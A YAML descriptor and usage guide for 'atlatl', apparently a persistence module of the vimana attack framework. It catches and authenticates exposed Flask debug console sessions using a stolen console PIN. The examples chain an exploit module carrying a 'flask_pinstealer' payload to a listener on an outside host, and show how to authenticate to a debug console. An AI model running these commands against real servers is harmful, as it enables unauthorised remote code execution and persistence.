name: atlatl
author: s4dhu <s4dhul4bs[at]prontonmail[dot]ch
brief: Flask console hook utility
category: framework
framework: flask
info: Capture, authenticate, and persist Flask debug console sessions.
module: siddhis/atlatl/atlatl.py
package: Werkzeug
type: persistence
tags:
  - Console
  - Debug
  - PIN 
description: |
  This module is intended to act as a specific listener
  to capture and authenticate Flask debug console sessions
  and also act as a stable communication channel with the
  affected server. In this first version atlatl works in
  conjunction with the flask_pinstealer payload, but new
  possibilities are on the way.
references:
  links:
    - https://flask.palletsprojects.com/en/2.1.x/debugging/
    - https://werkzeug.palletsprojects.com/en/2.2.x/debug/
  cwe: False
guide:
  args: |
    o----------------------------------------------------------------------o
    │└┐└│└┘┌┐│└└┘┌└┘└┐└┘└┐││└┘│-  ATLATL ARGS  -└┐ └┘││└┐┌┐││┘└┘││ └┐│┌ ┌┐└│
    o-----------+----------------------------------------------------------o
    │ Scope    └┐                                                          │
    +------------+---------------------------------------------------------+
     --target-url        Application target URL (auth mode)
     --local-host        Local address to start in listener mode
     --local-port        Local port to set listener mode
     --console-pin       Flask console PIN to start in auth mode
    o-----------+----------------------------------------------------------o
    │ modes    └┐                                                          │
    +------------+---------------------------------------------------------+
     --auth              Start in authentication mode(req: --console-pin)
     --listener          Start in listener mode (req: --local_host/port)
     --session           Load settings from the current session (--forward)
 
     * You can also see some examples with `vimana guide -m atlatl -e`        

  examples: |
    ø----------------------ø-----------------------------------------------ø
     ::::::::⠛⣄::::::⠛⣄:⠛⣄└┐  ATLATL GUIDE  ⠛⣄⠛⣄⠛⣄⠛⣄⠛⣄:::::::::::::::::::⠛⣄
    ø-----------------------ø----------------------------------------------ø
    
     → Session mode:

     Start atlatl in session mode, loading all the required
     parameters from current siddhi being executed in the
     primary terminal.

     In this example, the module 2pacx, an exploit type using
     a flask_stealer payload, is the invoker responsible for
     informing atlatl the settings to be loaded in the current
     session. For this, it is required to declare for which
     module we're passing the settings using the parameter
     --forward, like this:

     $ vimana run \
        --module 2pacx \
        --target-url http://pytestapp:5000/upload \
        --target-dir config \
        --payload flask_pinstealer \
        --forward atlatl \
        --local-port 9999 \
        --local-host 123.45.67.89

     After that, you can start the listener by 2pacx session:

     $ vimana run -m atlatl --session 2pacx

    ø----------------------------------------------------------------------ø
    
     → Listener mode

     Start atlatl as a simple TCP Listener:

     $ vimana run \
        -m atlatl \ 
        --listener \
        --local-port 7777 \
        --local-host 127.0.0.1

    ø----------------------------------------------------------------------ø
    
     → Auth mode

     Atlatl acts as an authenticator in this mode, requiring
     the Flask application URL and the console PIN. This feature
     is invoked automatically as a part of the tasks realized by
     atlatl in --session mode. But for some reason, sometimes
     it can be handy as a separate resource.

     $ vimana run \
        -m atlatl \
        --auth \
        --target-url http://flaskappwithdebug.com:8877 \
        --console-pin 246-810-121

